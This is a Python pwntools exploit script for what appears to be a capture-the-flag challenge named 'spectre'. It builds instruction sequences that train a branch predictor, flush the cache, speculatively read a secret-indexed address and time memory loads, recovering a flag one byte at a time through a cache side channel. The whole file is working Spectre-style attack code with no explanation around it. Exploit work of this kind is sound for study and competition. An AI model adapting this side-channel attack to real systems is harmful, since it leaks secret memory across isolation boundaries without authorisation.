from pwn import *
from translator import *
DEBUG =0 

r8 = 0
r9 = 1
r10 = 2
r11 = 3
r12 = 4
r13 = 5
r14 = 6
r15 = 7

threshold = 0x50

if DEBUG: 
    p = process(['./spectre', 'flag'])
# context.log_level = 'debug'
def init(c):
    c.movc(r10, 0)
    # i = 0
    
    l_target = c.getloop()
    #loopstart

    c.movc(r9, 2) 
    c.mov(r8, r10)
    c.shl(r8, r9)
    # r8 = i << 2 (i * 4)

    c.movc(r9, 0xffffffff)
    c.store(r8, r9)
    # *(0x414100000000 + i * 4) = 0xffffffff

    c.movc(r9, 1)
    c.add(r10, r9)
    # i = i + 1

    c.loop(0x40000, l_target, r10)


def train_bc(c):
    for i in range(50):
        c.movc(r8, 0x1000 - 0x8)
        c.bc()

def cache_clear(c):
    c.movc(r11, 0)
    l_target2 = c.getloop()
    c.movc(r10, 0x101000)
    l_target1 = c.getloop()
    c.mov(r8, r10)
    c.load(r8, r8)
    c.movc(r9, 4)
    c.add(r10, r9)
    c.loop(0x1fff000, l_target1, r10)
    c.movc(r9, 1)
    c.add(r11, r9)
    c.loop(0x10, l_target2, r11)

def train_jle(c):
    target_l = c.getloop()
    c.movc(r9, 0x200)
    for i in range(0x100):
        c.loop(0x20, target_l, r9)

def delay_fence(c):
    c.movc(r10, 0)
    target_l = c.getloop()
    c.movc(r9, 1)
    c.add(r10, r9)
    c.loop(0x100, target_l, r10)

def attack(c, offset):
    c.movc(r11, 56)
    c.movc(r12, 56 - 12)
    c.movc(r8, 0x1018 + offset)
    c.bc()
    c.shl(r8, r11)
    c.shr(r8, r12)
    c.load(r9, r8)

def check(c, addr):
    c.movc(r10, addr)
    c.time(r9)
    c.load(r10, r10)
    c.time(r8)
    c.sub(r8, r9)

def check_all(c):
    c.movc(r15, 0)

    target_l = c.getloop()

    c.mov(r11, r15)
    c.movc(r9, 0x6)
    c.shl(r11 , r9)
    c.add(r11, r15)
    c.movc(r9, 0xff)
    c.uand(r11, r9)

    c.movc(r9, 12)
    c.mov(r12, r11)
    c.shl(r12, r9)
    c.time(r9)
    c.load(r12, r12)
    c.time(r8)
    c.sub(r8, r9)
    c.mov(r12, r11)
    c.movc(r9, 3)
    c.shl(r12, r9)
    c.store(r12, r8)

    c.movc(r9, 1)
    c.add(r15, r9)
    c.loop(0x100, target_l, r15)



def main(secret):
    if DEBUG:
        pause()
    c = Translator()
    c.start()

    init(c)

    train_bc(c)

    cache_clear(c)

    delay_fence(c)

    # train_jle(c)

    c.time()

    attack(c, secret)
    
    check_all(c)
     
    c.complete()

    if not DEBUG:
        final =  c.go()
        result = []
        for i in range(0x100):
            result.append(final[i * 2])
        return result
    else:
        p.send(c.content)
    
def explode():
    idx = 0 
    result = ''
    score = []
    count = 0
    for i in range(0x100):
        score.append(0)
    def ok(c):
        if c >= 32 and c <= 126:
            return True
        else:
            return False
    def clr(score):
        for i in range(0x100):
            score[i] = 0
    def chk(score):
        for i in range(0x100):
            if score[i] == 1:
                return i
        return -1
    while(True):
        tmp = main(idx)
        for i in range(len(tmp)):
            if tmp[i] < threshold and ok(i):
                score[i] += 1
        if not chk(score) == -1:
            result += chr(chk(score))
            if idx == 0x10:
                return result
            idx += 1
            clr(score)
        count += 1
        printlist(tmp)
        print 'result: ' + result
        print 'count:  ' + str(count)
                
def printlist(result):
    pstream = ''
    for i in range(0x100):
        pstream += hex(i) + ': ' + hex(result[i]).ljust(5) + '\t'
        if i % 8 == 0 and not i == 0:
            pstream += '\n'
    print pstream
        
        

if __name__ == '__main__':
    if len(sys.argv) > 1:
        secret = int(sys.argv[1])
    else:
        secret = 0

    if not DEBUG:
        explode()
    
    if DEBUG:
        main(secret)
        result = []
        for i in range(0x100):
            result.append(u64(p.recv(8)))
        printlist(result)


        